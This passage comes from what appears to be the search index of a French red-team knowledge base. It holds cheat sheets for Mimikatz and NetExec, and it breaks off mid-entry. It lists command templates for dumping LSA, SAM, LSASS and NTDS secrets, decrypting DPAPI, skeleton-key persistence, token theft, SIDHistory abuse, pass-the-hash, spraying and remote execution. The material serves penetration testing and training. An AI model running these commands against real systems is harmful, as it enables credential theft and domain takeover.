<li>Usage : Obtenir les hashes locaux pour du Pass-The-Hash local ou du cracking offline.</li> <li>Pr\u00e9requis : Privil\u00e8ges SYSTEM. Peut n\u00e9cessiter de fournir les ruches SYSTEM et SAM (extraites du registre hors ligne, par exemple).</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#dump-des-secrets-lsa-stockes","title":"Dump des secrets LSA stock\u00e9s","text":"<pre><code>lsadump::secrets [/system:&lt;system_hive&gt;] [/security:&lt;security_hive&gt;]\n</code></pre> <ul> <li>Contexte : Extrait divers secrets stock\u00e9s dans le registre, souvent prot\u00e9g\u00e9s par les cl\u00e9s LSA (ex: mots de passe de service, cl\u00e9s de cache).</li> <li>Usage : R\u00e9cup\u00e9ration de secrets syst\u00e8me additionnels.</li> <li>Pr\u00e9requis : Privil\u00e8ges SYSTEM et potentiellement les ruches du registre.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#dump-des-cles-de-confiance-trust-keys","title":"Dump des cl\u00e9s de confiance (Trust Keys)","text":"<pre><code>lsadump::trust [/patch]\n</code></pre> <ul> <li>Contexte : Extrait les informations sur les relations d'approbation (trusts) \u00e9tablies par le domaine, y compris les cl\u00e9s/hashes de confiance.</li> <li>Usage : N\u00e9cessaire pour les attaques inter-domaines ou inter-for\u00eats (ex: forger des tickets pour un domaine approuv\u00e9).</li> <li>Pr\u00e9requis : Privil\u00e8ges Domain Admin ou \u00e9quivalent sur un DC.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#module-dpapi-decryptage-des-secrets-dpapi","title":"\ud83d\udee1\ufe0f Module <code>dpapi</code> (D\u00e9cryptage des secrets DPAPI)","text":""},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#extraire-les-cles-maitres-dpapi-masterkeys","title":"Extraire les cl\u00e9s ma\u00eetres DPAPI (Masterkeys)","text":"<pre><code>dpapi::masterkey [/in:&lt;masterkey_file&gt;] [/sid:&lt;user_sid&gt;] [/password:&lt;password&gt; | /hash:&lt;ntlm_hash&gt; | /pvk:&lt;backupkey.pvk&gt;] [/rpc]\n</code></pre> <ul> <li>Contexte : La DPAPI (Data Protection API) prot\u00e8ge de nombreux secrets utilisateur (mots de passe de navigateur, EFS, etc.) en utilisant une cl\u00e9 ma\u00eetre (Masterkey) d\u00e9riv\u00e9e du mot de passe de l'utilisateur. Cette commande tente de d\u00e9crypter ces cl\u00e9s ma\u00eetres.</li> <li>Usage : \u00c9tape n\u00e9cessaire pour pouvoir ensuite d\u00e9crypter les secrets prot\u00e9g\u00e9s par DPAPI.</li> <li>Pr\u00e9requis : N\u00e9cessite le mot de passe de l'utilisateur, son hash NTLM, ou une cl\u00e9 de sauvegarde du domaine (PVK). <code>/rpc</code> tente de le faire \u00e0 distance sur un DC.</li> <li>Options cl\u00e9s :<ul> <li><code>/in:</code> : Fichier de cl\u00e9 ma\u00eetre sp\u00e9cifique.</li> <li><code>/sid:</code> : SID de l'utilisateur cible.</li> <li><code>/password:</code>, <code>/hash:</code>, <code>/pvk:</code> : M\u00e9thode pour d\u00e9crypter la cl\u00e9 ma\u00eetre.</li> </ul> </li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#decrypter-des-secrets-dpapi-credentials-vaults-etc","title":"D\u00e9crypter des secrets DPAPI (Credentials, Vaults, etc.)","text":"<pre><code>dpapi::cred /in:&lt;credential_file&gt; /masterkey:&lt;decrypted_masterkey&gt;\ndpapi::vault /in:&lt;vault_file&gt; /masterkey:&lt;decrypted_masterkey&gt;\n</code></pre> <ul> <li>Contexte : Utilise une cl\u00e9 ma\u00eetre DPAPI d\u00e9crypt\u00e9e pour d\u00e9chiffrer des fichiers de secrets sp\u00e9cifiques (fichiers Credential, fichiers Vault).</li> <li>Usage : Acc\u00e9der aux mots de passe et autres secrets prot\u00e9g\u00e9s par DPAPI.</li> <li>Pr\u00e9requis : Une cl\u00e9 ma\u00eetre d\u00e9crypt\u00e9e via <code>dpapi::masterkey</code>.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#module-vault-acces-au-coffre-fort-windows","title":"\ud83d\udd10 Module <code>vault</code> (Acc\u00e8s au coffre-fort Windows)","text":""},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#lister-les-identifiants-du-coffre-fort-vault","title":"Lister les identifiants du coffre-fort (Vault)","text":"<pre><code>vault::list\nvault::cred [/patch]\n</code></pre> <ul> <li>Contexte : Le coffre-fort Windows (Windows Vault) stocke des identifiants pour les applications et les services (ex: RDP, connexions r\u00e9seau).</li> <li>Usage : Extraire les identifiants stock\u00e9s dans le coffre-fort de l'utilisateur courant. <code>/patch</code> peut \u00eatre n\u00e9cessaire sur certains syst\u00e8mes.</li> <li>Pr\u00e9requis : Doit \u00eatre ex\u00e9cut\u00e9 dans le contexte de l'utilisateur cible.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#module-crypto-manipulation-des-certificats-et-cles","title":"\ud83d\udcdc Module <code>crypto</code> (Manipulation des certificats et cl\u00e9s)","text":""},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#lister-les-magasins-de-certificats-et-les-certificats","title":"Lister les magasins de certificats et les certificats","text":"<pre><code>crypto::stores [/system]\ncrypto::certificates [/store:&lt;store_name&gt;] [/system] [/export]\n</code></pre> <ul> <li>Contexte : Permet d'\u00e9num\u00e9rer les magasins de certificats (personnel, machine) et les certificats qu'ils contiennent.</li> <li>Usage : Reconnaissance, recherche de certificats exportables avec leur cl\u00e9 priv\u00e9e.</li> <li>Options cl\u00e9s :<ul> <li><code>/system</code> : Cible les magasins de la machine au lieu de ceux de l'utilisateur.</li> <li><code>/export</code> : Tente d'exporter les certificats trouv\u00e9s (souvent avec la cl\u00e9 priv\u00e9e si possible).</li> </ul> </li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#lister-les-fournisseurs-de-cles-cryptographiques-csp-et-les-cles","title":"Lister les fournisseurs de cl\u00e9s cryptographiques (CSP) et les cl\u00e9s","text":"<pre><code>crypto::providers\ncrypto::keys [/provider:&lt;provider_name&gt;] [/system] [/export]\n</code></pre> <ul> <li>Contexte : \u00c9num\u00e8re les fournisseurs de services cryptographiques et les cl\u00e9s priv\u00e9es associ\u00e9es (stock\u00e9es de mani\u00e8re prot\u00e9g\u00e9e).</li> <li>Usage : Tenter d'extraire des cl\u00e9s priv\u00e9es (ex: cl\u00e9s de certificats non exportables).</li> <li>Pr\u00e9requis : Privil\u00e8ges \u00e9lev\u00e9s souvent n\u00e9cessaires.</li> <li>Options cl\u00e9s :<ul> <li><code>/export</code> : Tente d'exporter les cl\u00e9s priv\u00e9es.</li> </ul> </li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#module-misc-commandes-diverses","title":"\u2699\ufe0f Module <code>misc</code> (Commandes diverses)","text":""},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#attaque-skeleton-key","title":"Attaque Skeleton Key","text":"<pre><code>misc::skeleton\n</code></pre> <ul> <li>Contexte : Injecte une \"cl\u00e9 squelette\" (un mot de passe ma\u00eetre comme <code>mimikatz</code>) dans le processus LSASS sur un contr\u00f4leur de domaine. Cela permet ensuite de s'authentifier sur le domaine avec n'importe quel compte en utilisant ce mot de passe ma\u00eetre (via NTLM uniquement).</li> <li>Usage : M\u00e9thode de persistance puissante sur un DC.</li> <li>Pr\u00e9requis : Privil\u00e8ges Domain Admin ou SYSTEM sur un DC.</li> <li>OPSEC : Tr\u00e8s bruyant et facilement d\u00e9tectable. Modifie LSASS en m\u00e9moire. L'effet dispara\u00eet au red\u00e9marrage du DC.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#executer-une-commande-systeme","title":"Ex\u00e9cuter une commande syst\u00e8me","text":"<pre><code>misc::cmd\n</code></pre> <ul> <li>Contexte : Ouvre une nouvelle invite de commande (<code>cmd.exe</code>) avec les privil\u00e8ges actuels de Mimikatz.</li> <li>Usage : Utile pour lancer rapidement des commandes syst\u00e8me apr\u00e8s avoir obtenu des privil\u00e8ges via Mimikatz.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#module-token-manipulation-des-jetons-dacces","title":"\ud83d\udcc8 Module <code>token</code> (Manipulation des jetons d'acc\u00e8s)","text":""},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#lister-les-jetons-disponibles","title":"Lister les jetons disponibles","text":"<pre><code>token::list\n</code></pre> <ul> <li>Contexte : Affiche les jetons d'acc\u00e8s pr\u00e9sents sur le syst\u00e8me, repr\u00e9sentant diff\u00e9rentes sessions de connexion ou niveaux de privil\u00e8ges.</li> <li>Usage : Reconnaissance pour identifier des jetons int\u00e9ressants \u00e0 usurper.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#elever-les-privileges-au-niveau-system","title":"\u00c9lever les privil\u00e8ges au niveau SYSTEM","text":"<pre><code>token::elevate [/domainadmin]\n</code></pre> <ul> <li>Contexte : Tente d'usurper le jeton d'un processus SYSTEM pour obtenir les privil\u00e8ges <code>NT AUTHORITY\\SYSTEM</code>.</li> <li>Usage : \u00c9l\u00e9vation de privil\u00e8ges locale classique si Mimikatz est ex\u00e9cut\u00e9 en tant qu'administrateur. <code>/domainadmin</code> tente d'usurper un jeton de Domain Admin si disponible.</li> <li>Pr\u00e9requis : Administrateur local.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#usurper-un-jeton-specifique","title":"Usurper un jeton sp\u00e9cifique","text":"<pre><code>token::run /user:&lt;username&gt; &lt;program.exe&gt;\ntoken::steal &lt;process_id&gt;\ntoken::impersonate &lt;token_id&gt;\n</code></pre> <ul> <li>Contexte : Permet de lancer un processus (<code>run</code>), de voler (<code>steal</code>) ou d'usurper (<code>impersonate</code>) le jeton d'un autre utilisateur ou processus.</li> <li>Usage : \u00c9l\u00e9vation de privil\u00e8ges ou mouvement lat\u00e9ral en utilisant les droits associ\u00e9s \u00e0 un jeton vol\u00e9.</li> <li>Pr\u00e9requis : <code>SeImpersonatePrivilege</code> ou <code>SeAssignPrimaryTokenPrivilege</code> (souvent disponibles pour les comptes de service ou admins).</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#module-sid-manipulation-des-sid","title":"\ud83d\udcbe Module <code>sid</code> (Manipulation des SID)","text":""},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#ajouter-un-sid-a-lattribut-sidhistory","title":"Ajouter un SID \u00e0 l'attribut SIDHistory","text":"<pre><code>sid::add /sam:&lt;compte_cible&gt; /new:&lt;sid_a_ajouter | compte_source&gt;\n</code></pre> <ul> <li>Contexte : Ajoute un SID (par exemple, celui du groupe Enterprise Admins, S-1-5-21-...-519) \u00e0 l'attribut <code>SIDHistory</code> d'un compte utilisateur ou machine. L'utilisateur h\u00e9rite alors des privil\u00e8ges associ\u00e9s \u00e0 ce SID ajout\u00e9.</li> <li>Usage : M\u00e9thode de persistance et d'escalade de privil\u00e8ges, souvent utilis\u00e9e avec DCShadow pour la discr\u00e9tion.</li> <li>Pr\u00e9requis : Privil\u00e8ges \u00e9lev\u00e9s (souvent Domain Admin).</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/NetExec/","title":"NetExec","text":"<p>Objectif : NetExec (anciennement CrackMapExec/CME) est un outil post-exploitation con\u00e7u pour \u00e9valuer la s\u00e9curit\u00e9 des grands r\u00e9seaux Active Directory (et autres environnements). Il excelle dans l'\u00e9num\u00e9ration, la v\u00e9rification d'identifiants (spraying), l'ex\u00e9cution de commandes et l'extraction de secrets sur de multiples h\u00f4tes simultan\u00e9ment via divers protocoles (SMB, LDAP, WinRM, MSSQL, etc.).</p> <p>Source : https://github.com/Pennyw0rth/NetExec</p> <p>Syntaxe G\u00e9n\u00e9rale : <code>netexec &lt;protocole&gt; &lt;cibles&gt; [options_authentification] [options_action]</code></p> <p>Cibles : Peut \u00eatre une IP unique, une plage CIDR (192.168.1.0/24), un nom d'h\u00f4te, ou un fichier contenant une liste de cibles (<code>-t targets.txt</code>).</p> <p>OPSEC : NetExec peut \u00eatre tr\u00e8s \"bruyant\" sur le r\u00e9seau. Les actions comme le password spraying, l'ex\u00e9cution de commandes, ou le dump de secrets (SAM, LSA, NTDS) sont g\u00e9n\u00e9ralement d\u00e9tect\u00e9es par les EDR/SIEM. Utilisez avec prudence et adaptez les options (<code>--timeout</code>, <code>--threads</code>) \u00e0 l'environnement.</p>"},{"location":"Red%20Team/Cheatsheets/Tools/NetExec/#authentification","title":"Authentification","text":"<p>NetExec supporte plusieurs m\u00e9thodes pour s'authentifier aupr\u00e8s des cibles :</p>"},{"location":"Red%20Team/Cheatsheets/Tools/NetExec/#mot-de-passe-en-clair","title":"Mot de passe en clair","text":"<pre><code>netexec &lt;proto&gt; &lt;cible&gt; -u &lt;utilisateur | fichier_users&gt; -p &lt;mot_de_passe | fichier_pass&gt; [-d &lt;domaine&gt;]\n</code></pre> <ul> <li> <p>Usage : M\u00e9thode la plus simple, mais expose les mots de passe. Utile pour tester un identifiant sp\u00e9cifique ou faire du password spraying.</p> </li> <li> <p><code>-d &lt;domaine&gt;</code> : Sp\u00e9cifie le domaine (ex: <code>CONTOSO.local</code>). N\u00e9cessaire pour les comptes de domaine.</p> </li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/NetExec/#hash-ntlm-pass-the-hash","title":"Hash NTLM (Pass-The-Hash)","text":"<pre><code>netexec &lt;proto&gt; &lt;cible&gt; -u &lt;utilisateur&gt; -H &lt;hash_ntlm | lm:ntlm&gt; [-d &lt;domaine&gt;]\n</code></pre> <ul> <li> <p>Usage : Permet de s'authentifier en utilisant directement le hash NTLM de l'utilisateur, sans conna\u00eetre le mot de passe en clair. Tr\u00e8s courant en post-exploitation.</p> </li> <li> <p><code>-H &lt;hash&gt;</code> : Fournir le hash NTLM complet, ou au format <code>LM:NTLM</code>.</p> </li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/NetExec/#ticket-kerberos-pass-the-ticket","title":"Ticket Kerberos (Pass-The-Ticket)","text":"<pre><code>export KRB5CCNAME=/chemin/vers/ticket.ccache\nnetexec &lt;proto&gt; &lt;cible&gt; -k [--use-kcache] [-d &lt;domaine&gt;]\n</code></pre> <ul> <li> <p>Usage : S'authentifie en utilisant un ticket Kerberos (TGT ou TGS) valide stock\u00e9 dans un fichier cache (<code>.ccache</code>).</p> </li> <li> <p><code>-k</code> : Active l'authentification Kerberos.</p> </li> <li> <p><code>--use-kcache</code> : Indique explicitement d'utiliser le fichier d\u00e9fini par <code>KRB5CCNAME</code>.</p> </li> <li> <p>Pr\u00e9requis : Un ticket Kerberos valide pour un utilisateur du domaine cible.</p> </li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/NetExec/#connexion-anonyme-null-session-smbldap","title":"Connexion Anonyme / Null Session (SMB/LDAP)","text":"<pre><code>netexec smb &lt;cible&gt; -u '' -p ''\nnetexec ldap &lt;cible&gt; -u '' -p ''\n</code></pre> <ul> <li>Usage : Tente de se connecter sans identifiants. Utile pour l'\u00e9num\u00e9ration initiale si les sessions null sont autoris\u00e9es (rare sur les syst\u00e8mes modernes et patch\u00e9s).</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/NetExec/#authentification-locale-smb","title":"Authentification Locale (SMB)","text":"<pre><code>netexec smb &lt;cible&gt; -u &lt;utilisateur&gt; -p &lt;mot_de_passe&gt; --local-auth\n</code></pre> <ul> <li>Usage : Force l'authentification en utilisant les comptes locaux de la machine cible plut\u00f4t que les comptes de domaine.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/NetExec/#protocole-smb-server-message-block","title":"\ud83d\uddc4\ufe0f Protocole SMB (Server Message Block)","text":"<p>Utilis\u00e9 pour le partage de fichiers, l'impression, et certaines interactions \u00e0 distance sous Windows.</p>"},{"location":"Red%20Team/Cheatsheets/Tools/NetExec/#enumeration-de-base","title":"\u00c9num\u00e9ration de Base","text":"<pre><code># V\u00e9rifier l'acc\u00e8s (authentification)\nnetexec smb &lt;cible&gt; -u &lt;user&gt; -p &lt;pass | -H hash&gt; [-d domain]\n\n# Lister les partages accessibles\nnetexec smb &lt;cible&gt; -u &lt;user&gt; -p &lt;pass | -H hash&gt; --shares\n\n# Lister les sessions actives (qui est connect\u00e9 ?)\nnetexec smb &lt;cible&gt; -u &lt;user&gt; -p &lt;pass | -H hash&gt; --sessions\n\n# Lister les disques mont\u00e9s\nnetexec smb &lt;cible&gt; -u &lt;user&gt; -p &lt;pass | -H hash&gt; --disks\n\n# Lister les utilisateurs connect\u00e9s (loggedon)\nnetexec smb &lt;cible&gt; -u &lt;user&gt; -p &lt;pass | -H hash&gt; --loggedon-users\n\n# Lister les utilisateurs et groupes locaux/domaine\nnetexec smb &lt;cible&gt; -u &lt;user&gt; -p &lt;pass | -H hash&gt; --users\nnetexec smb &lt;cible&gt; -u &lt;user&gt; -p &lt;pass | -H hash&gt; --groups\n\n# \u00c9num\u00e9rer la politique de mot de passe du domaine\nnetexec smb &lt;cible&gt; [-u &lt;user&gt; -p &lt;pass | -H hash&gt;] --pass-pol\n</code></pre> <ul> <li> <p>Contexte : Ces commandes permettent d'obtenir une vue d'ensemble de la configuration SMB de la cible, des ressources partag\u00e9es, et de l'activit\u00e9 utilisateur.</p> </li> <li> <p>Usage : Reconnaissance initiale, identification de partages int\u00e9ressants, recherche de sessions d'utilisateurs privil\u00e9gi\u00e9s.</p> </li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/NetExec/#modules-denumeration-et-vulnerabilites-m","title":"Modules d'\u00c9num\u00e9ration et Vuln\u00e9rabilit\u00e9s (<code>-M</code>)","text":"<pre><code># V\u00e9rifier si SMB Signing est d\u00e9sactiv\u00e9 (vuln\u00e9rable au relais NTLM)\nnetexec smb &lt;cible | subnet&gt; --gen-relay-list smb_signing_off.txt\n\n# V\u00e9rifier vuln\u00e9rabilit\u00e9s sp\u00e9cifiques (exemples)\nnetexec smb &lt;cible&gt; [-u '' -p ''] -M ms17-010 # EternalBlue/WannaCry\nnetexec smb &lt;cible&gt; [-u '' -p ''] -M zerologon # Zerologon (CVE-2020-1472)\nnetexec smb &lt;cible&gt; [-u '' -p ''] -M petitpotam # PetitPotam (Relais NTLM)\nnetexec smb &lt;cible&gt; [-u '' -p ''] -M nopac # SAM Account Name Spoofing (CVE-2021-42278 &amp; CVE-2021-42287)\n\n# V\u00e9rifier si le service Spooler (Imprimante) est actif (vuln\u00e9rable \u00e0 PrintNightmare)\nnetexec smb &lt;cible&gt; [-u &lt;user&gt; -p &lt;pass | -H hash&gt;] -M spooler\n\n# \u00c9num\u00e9rer les GPOs appliqu\u00e9es\nnetexec smb &lt;cible&gt; -u &lt;user&gt; -p &lt;pass | -H hash&gt; -M gpo\n\n# \u00c9num\u00e9rer les ACLs int\u00e9ressantes (qui a quels droits sur quoi)\nnetexec smb &lt;cible&gt; -u &lt;user&gt; -p &lt;pass | -H hash&gt; -M acl\n</code></pre> <ul> <li> <p>Contexte : Utilisation de modules sp\u00e9cifiques pour rechercher des vuln\u00e9rabilit\u00e9s connues ou obtenir des informations plus d\u00e9taill\u00e9es.</p> </li> <li> <p>Usage : Identification rapide de failles exploitables ou de configurations dangereuses.</p> </li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/NetExec/#execution-de-commandes-x-x-m","title":"Ex\u00e9cution de Commandes (<code>-x</code>, <code>-X</code>, <code>-M</code>)","text":"<pre><code># Ex\u00e9cuter une commande simple via diff\u00e9rentes m\u00e9thodes (SMBExec, WMIExec, ATExec...)\nnetexec smb &lt;cible&gt; -u &lt;user&gt; -p &lt;pass | -H hash&gt; -x &lt;commande&gt;\n\n# Ex\u00e9cuter une commande PowerShell plus complexe\nnetexec smb &lt;cible&gt; -u &lt;user&gt; -p &lt;pass | -H hash&gt; -X 'powershell -enc &lt;base64_payload&gt;'\n</code></pre> <ul> <li> <p>Contexte : Permet d'ex\u00e9cuter des commandes \u00e0 distance sur les cibles o\u00f9 l'authentification r\u00e9ussit.</p> </li> <li> <p>Usage : Mouvement lat\u00e9ral, ex\u00e9cution de payloads, collecte d'informations suppl\u00e9mentaires.</p> </li> <li> <p>Pr\u00e9requis : Droits d'administrateur local sur la machine cible.</p> </li> <li> <p>OPSEC : L'ex\u00e9cution de commandes est une action tr\u00e8s surveill\u00e9e.</p> </li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/NetExec/#acces-aux-fichiers-et-partages","title":"Acc\u00e8s aux Fichiers et Partages","text":"<pre><code># Lister r\u00e9cursivement les fichiers/dossiers sur les partages accessibles\nnetexec smb &lt;cible&gt; -u &lt;user&gt; -p &lt;pass | -H hash&gt; --spider [nom_partage]\n\n# Lister et potentiellement t\u00e9l\u00e9charger des fichiers int\u00e9ressants (plus avanc\u00e9)\nnetexec smb &lt;cible&gt; -u &lt;user&gt; -p &lt;pass | -H hash&gt; -M spider_plus [-o READ_ONLY=false DEPTH=2]\n# -o READ_ONLY=false : Tente de t\u00e9l\u00e9charger les fichiers trouv\u00e9s\n# -o DEPTH=X : Profondeur de la recherche\n\n\n# T\u00e9l\u00e9charger un fichier sp\u00e9cifique\nnetexec smb &lt;cible&gt; -u &lt;user&gt; -p &lt;pass | -H hash&gt; --get-file '\\\\&lt;PARTAGE&gt;\\&lt;chemin&gt;\\fichier.txt' fichier_local.txt\n\n# Uploader un fichier sp\u00e9cifique\nnetexec smb &lt;cible&gt; -u &lt;user&gt; -p &lt;pass | -H hash&gt; --put-file fichier_local.txt '\\\\&lt;PARTAGE&gt;\\&lt;chemin&gt;\\fichier.txt'\n</code></pre> <ul> <li> <p>Contexte : Interagir avec les partages de fichiers SMB.</p> </li> <li> <p>Usage : Recherche de fichiers sensibles, exfiltration de donn\u00e9es, d\u00e9p\u00f4t d'outils/payloads.</p> </li> <li> <p>Pr\u00e9requis : Permissions de lecture/\u00e9criture appropri\u00e9es sur les partages.</p> </li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/NetExec/#dump-dinformations-sensibles","title":"Dump d'Informations Sensibles","text":"<p>[!Attention]</p> <p>Ces actions sont tr\u00e8s intrusives, bruyantes et n\u00e9cessitent des privil\u00e8ges \u00e9lev\u00e9s (Admin local ou Domain Admin).</p> <pre><code># Dumper les hashes SAM locaux\nnetexec smb &lt;cible&gt; -u &lt;user&gt; -p &lt;pass | -H hash&gt; --sam\n\n# Dumper les secrets LSA locaux (peut contenir cl\u00e9s, mots de passe de service...)\nnetexec smb &lt;cible&gt; -u &lt;user&gt; -p &lt;pass | -H hash&gt; --lsa\n\n# Dumper la m\u00e9moire du processus LSASS (peut contenir mots de passe en clair, tickets...)\nnetexec smb &lt;cible&gt; -u &lt;user&gt; -p &lt;pass | -H hash&gt; -M lsassy\n\n# Dumper la base de donn\u00e9es NTDS.dit (hashes de tous les comptes du domaine)\nnetexec smb &lt;DC_cible&gt; -u &lt;domain_admin&gt; -p &lt;pass | -H hash&gt; --ntds [vss]\n# [vss] : Utilise Volume Shadow Copy pour une copie plus stable (recommand\u00e9)\n# Pr\u00e9requis: Domain Admin sur un Contr\u00f4leur de Domaine.\n\n# Dumper les cl\u00e9s DPAPI\nnetexec smb &lt;cible&gt; -u &lt;user&gt; -p &lt;pass | -H hash&gt; --dpapi\n\n# Dumper les mots de passe Wifi stock\u00e9s\nnetexec smb &lt;cible&gt; -u &lt;user&gt; -p &lt;pass | -H hash&gt; -M wireless\n\n# Rechercher des fichiers Keepass et tenter d'extraire la masterkey\nnetexec smb &lt;cible&gt; -u &lt;user&gt; -p &lt;pass | -H hash&gt; -M keepass_discover\n\nnetexec smb &lt;cible&gt; -u &lt;user&gt; -p &lt;pass | -H hash&gt; -M keepass_trigger -o KEEPASS_CONFIG_PATH=\"&lt;chemin_trouv\u00e9&gt;\"\n</code></pre> <ul> <li> <p>Contexte : Extraction directe d'identifiants et de secrets depuis les syst\u00e8mes cibles.</p> </li> <li> <p>Usage : Objectif principal de nombreuses attaques pour obtenir des identifiants et \u00e9lever les privil\u00e8ges.</p> </li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/NetExec/#protocole-ldap-lightweight-directory-access-protocol","title":"\ud83d\udcd4 Protocole LDAP (Lightweight Directory Access Protocol)","text":"<p>Utilis\u00e9 pour interroger et interagir avec l'annuaire Active Directory.</p>"},{"location":"Red%20Team/Cheatsheets/Tools/NetExec/#enumeration-ldap","title":"\u00c9num\u00e9ration LDAP","text":"<pre><code># \u00c9num\u00e9ration de base (infos domaine, DC)\nnetexec ldap &lt;DC_cible&gt; [-u &lt;user&gt; -p &lt;pass | -H hash&gt;]\n\n# Lister les utilisateurs (avec descriptions si disponibles)\nnetexec ldap &lt;DC_cible&gt; [-u &lt;user&gt; -p &lt;pass | -H hash&gt;] --users\n\nnetexec ldap &lt;DC_cible&gt; [-u &lt;user&gt; -p &lt;pass | -H hash&gt;] -M get-desc-users\n\n# Lister les groupes\nnetexec ldap &lt;DC_cible&gt; [-u &lt;user&gt; -p &lt;pass | -H hash&gt;] --groups\n\n# Lister les ordinateurs\nnetexec ldap &lt;DC_cible&gt; [-u &lt;user&gt; -p &lt;pass | -H hash&gt;] --computers\n</code></pre> <ul> <li> <p>Contexte : Interrogation de l'annuaire AD pour obtenir des informations sur les objets (utilisateurs, groupes, ordinateurs).</p> </li> <li> <p>Usage : Reconnaissance fondamentale en environnement AD. Peut souvent \u00eatre fait avec un compte utilisateur standard.</p> </li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/NetExec/#attaques-basees-sur-ldap","title":"Attaques Bas\u00e9es sur LDAP","text":"<pre><code># AS-REP Roasting (Recherche/Exploitation des comptes sans pr\u00e9-authentification)\nnetexec ldap &lt;DC_cible&gt; [-u &lt;user&gt; -p &lt;pass | -H hash&gt;] --asreproast &lt;fichier_hashes&gt;\n# Note: Peut parfois fonctionner en anonyme si on fournit une liste d'utilisateurs (-u users.txt -p '')\n\n# Kerberoasting (Recherche/Exploitation des comptes avec SPN)\nnetexec ldap &lt;DC_cible&gt; -u &lt;user&gt; -p &lt;pass | -H hash&gt; --kerberoasting &lt;fichier_hashes&gt;\n\n\n\n# \u00c9num\u00e9rer les comptes avec d\u00e9l\u00e9gation non contrainte (Unconstrained Delegation)\nnetexec ldap &lt;DC_cible&gt; -u &lt;user&gt; -p &lt;pass | -H hash&gt; --trusted-to-auth\n\n# \u00c9num\u00e9rer les ACLs int\u00e9ressantes (peut r\u00e9v\u00e9ler des chemins de PrivEsc)\nnetexec ldap &lt;DC_cible&gt; -u &lt;user&gt; -p &lt;pass | -H hash&gt; -M acl [-o USER=\"&lt;user_cible&gt;\"]\n\n# \u00c9num\u00e9rer le quota de cr\u00e9ation de comptes machine (ms-DS-MachineAccountQuota)\nnetexec ldap &lt;DC_cible&gt; [-u &lt;user&gt; -p &lt;pass | -H hash&gt;] -M maq\n</code></pre> <ul> <li> <p>Contexte : Utilisation de requ\u00eates LDAP sp\u00e9cifiques pour identifier des configurations vuln\u00e9rables ou extraire des informations permettant des attaques hors ligne (crack de hash).</p> </li> <li> <p>Usage : Recherche de vecteurs d'escalade de privil\u00e8ges ou de compromission de comptes.</p> </li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/NetExec/#protocole-winrm-windows-remote-management","title":"\ud83d\udcbb Protocole WINRM (Windows Remote Management)","text":"<p>Permet l'administration \u00e0 distance via PowerShell Remoting.</p> <pre><code># V\u00e9rifier l'acc\u00e8s WinRM\nnetexec winrm &lt;cible&gt; -u &lt;user&gt; -p &lt;pass | -H hash&gt;\n\n# Ex\u00e9cuter une commande via WinRM\nnetexec winrm &lt;cible&gt; -u &lt;user&gt; -p &lt;pass | -H hash&gt; -X &lt;commande&gt;\n# Exemple: netexec winrm SRV01 -u admin -H &lt;hash&gt; -X 'Get-Process'\n</code></pre> <ul> <li> <p>Contexte : Alternative \u00e0 SMB pour l'ex\u00e9cution de commandes \u00e0 distance, utilise PowerShell.</p> </li> <li> <p>Usage : Mouvement lat\u00e9ral, ex\u00e9cution de scripts PowerShell.</p> </li> <li> <p>Pr\u00e9requis : WinRM doit \u00eatre activ\u00e9 et configur\u00e9 sur la cible, et l'utilisateur doit avoir les droits appropri\u00e9s (souvent admin local ou membre du groupe \"Remote Management Users\").</p> </li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/NetExec/#protocole-mssql-microsoft-sql-server","title":"\ud83d\uddc4\ufe0f Protocole MSSQL (Microsoft SQL Server)","text":"<p>Interaction avec les bases de donn\u00e9es SQL Server.</p> <pre><code># V\u00e9rifier l'acc\u00e8s MSSQL (Authentification SQL ou Windows)\nnetexec mssql &lt;cible&gt; -u &lt;sql_user&gt; -p &lt;pass&gt;\n\nnetexec mssql &lt;cible&gt; -u &lt;win_user&gt; -p &lt;pass | -H hash&gt; --local-auth # Auth Windows locale\n\nnetexec mssql &lt;cible&gt; -u &lt;dom_user&gt; -p &lt;pass | -H hash&gt; -d &lt;domaine&gt; # Auth Windows domaine\n\n# Ex\u00e9cuter une requ\u00eate SQL\nnetexec mssql &lt;cible&gt; -u &lt;user&gt; -p &lt;pass&gt; -q \"SELECT @@version;\"\n\n# Tenter d'activer et utiliser xp_cmdshell pour ex\u00e9cuter des commandes syst\u00e8me\nnetexec mssql &lt;cible&gt; -u &lt;sa_user&gt; -p &lt;pass&gt; -M xpcmdshell -o COMMAND=\"whoami\"\n# Pr\u00e9requis: Privil\u00e8ges \u00e9lev\u00e9s sur MSSQL (ex: sysadmin).\n\n# \u00c9num\u00e9rer les privil\u00e8ges de l'utilisateur 